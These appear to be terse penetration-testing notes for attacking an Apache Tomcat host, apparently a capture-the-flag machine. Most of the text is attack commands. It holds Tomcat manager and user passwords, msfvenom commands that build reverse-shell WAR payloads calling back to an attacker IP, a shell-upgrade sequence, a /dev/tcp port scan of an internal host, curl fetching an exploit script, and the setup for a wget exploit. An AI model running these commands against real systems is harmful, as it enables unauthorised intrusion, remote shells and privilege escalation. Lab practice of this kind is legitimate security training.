# Notes

REPURPOSED CMD by CMD

```bash
:8080/manager/html
admin : 3@g01PdhB!

msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.58 lport=10001 -f war -o kalisa.war
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.58 lport=10002 -f war -o asilak.war
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.58 lport=10004 -f war -o idiot.war

# engrampa to note the .jsp file for calling the reserver shell
engrampa kalisa.war
engrampa asilak.war

asilak/qbfwxhqoqgtfbd.jsp
kalisa/vegezcdnllksu.jsp

# pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=screen-256color 
# Ctrl Z
# Check rows and cols
stty -a
stty -raw echo;fg

su atanas - 
f16tomcat!

cd /dev/shm

for port in $(seq 1 65535); do (echo Hello > /dev/tcp/10.0.3.133/$port && echo "open - $port") 2> /dev/null; done

curl http://$IP/40064.py

authbind python -m pyftpdlib -p21 -w
authbind python wget-exploit.py

```